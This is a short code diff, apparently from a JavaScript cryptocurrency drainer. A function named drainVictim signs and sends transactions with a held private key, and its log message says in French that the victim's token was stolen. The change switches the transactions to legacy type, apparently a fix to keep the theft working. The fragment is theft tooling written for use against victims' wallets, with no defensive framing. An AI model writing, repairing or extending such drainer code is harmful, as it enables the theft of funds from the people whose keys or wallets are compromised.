@@ -111,11 +111,10 @@ async function drainVictim(victimAddress, chainId) {
         gas: gasLimit,
         gasPrice: gasPrice,
         nonce: nonce,
-        maxFeePerGas: (BigInt(gasPrice) * 2n).toString(),
-        maxPriorityFeePerGas: (BigInt(gasPrice) / 2n).toString(),
+        type: '0x00'  // Force legacy
       };
 
-      const signedTx = await web3.eth.accounts.signTransaction(tx, privateKeyBuffer, { type: 0 });
+      const signedTx = await web3.eth.accounts.signTransaction(tx, privateKeyBuffer);
       const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
       console.log(`✅ ${tokenName} volé ! Tx: ${receipt.transactionHash}`);
 
